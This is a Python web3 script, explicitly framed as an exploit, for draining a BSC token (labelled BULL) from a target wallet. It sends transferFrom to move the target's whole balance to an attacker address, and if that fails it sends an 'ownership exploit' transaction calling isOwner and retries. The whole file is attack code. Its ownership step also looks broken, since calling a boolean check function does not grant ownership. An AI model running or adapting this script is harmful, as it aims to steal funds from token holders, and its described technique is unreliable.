from web3 import Web3
from web3.middleware import geth_poa_middleware
import argparse, getpass, time

def exploit():
    parser = argparse.ArgumentParser()
    parser.add_argument('--rpc', default="https://bsc-dataseed.binance.org/")
    parser.add_argument('--token', required=True)
    parser.add_argument('--target', required=True)
    parser.add_argument('--attacker', required=True)
    args = parser.parse_args()

    w3 = Web3(Web3.HTTPProvider(args.rpc))
    w3.middleware_onion.inject(geth_poa_middleware, layer=0)

    private_key = getpass.getpass("Enter attacker private key: ")
    account = w3.eth.account.from_key(private_key)

    # Complete ABI with all functions
    token_abi = [
        {"inputs":[{"name":"a","type":"address"}],"name":"isOwner","outputs":[{"name":"","type":"bool"}],"type":"function"},
        {"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"},
        {"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},
        {"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"}
    ]
    
    token = w3.eth.contract(address=args.token, abi=token_abi)

    print("\n[1] Verifying contract access...")
    try:
        # Try direct transfer first
        balance = token.functions.balanceOf(args.target).call()
        decimals = token.functions.decimals().call()
        amount = balance
        
        print(f"\n[2] Attempting direct transfer of {amount/(10**decimals)} BULL")
        tx = token.functions.transferFrom(
            args.target,
            args.attacker,
            amount
        ).build_transaction({
            'from': args.attacker,
            'gas': 300000,
            'gasPrice': w3.eth.gas_price,
            'nonce': w3.eth.get_transaction_count(args.attacker)
        })
        signed = account.sign_transaction(tx)
        tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
        receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
        
        if receipt.status == 1:
            print(f"✅ Success! TX: {tx_hash.hex()}")
        else:
            print(f"❌ TX reverted: {tx_hash.hex()}")
            print("\n[3] Attempting ownership exploit...")
            tx = token.functions.isOwner(args.attacker).build_transaction({
                'from': args.attacker,
                'gas': 300000,
                'gasPrice': w3.eth.gas_price,
                'nonce': w3.eth.get_transaction_count(args.attacker)
            })
            signed = account.sign_transaction(tx)
            tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
            receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
            print(f"Ownership TX: {tx_hash.hex()}")
            
            # Retry transfer after ownership claim
            time.sleep(10)
            tx = token.functions.transferFrom(
                args.target,
                args.attacker,
                amount
            ).build_transaction({
                'from': args.attacker,
                'gas': 300000,
                'gasPrice': w3.eth.gas_price,
                'nonce': w3.eth.get_transaction_count(args.attacker)
            })
            signed = account.sign_transaction(tx)
            tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
            receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
            print(f"Final Drain TX: {tx_hash.hex()}")

    except Exception as e:
        print(f"❌ Error: {str(e)}")

if __name__ == "__main__":
    exploit()
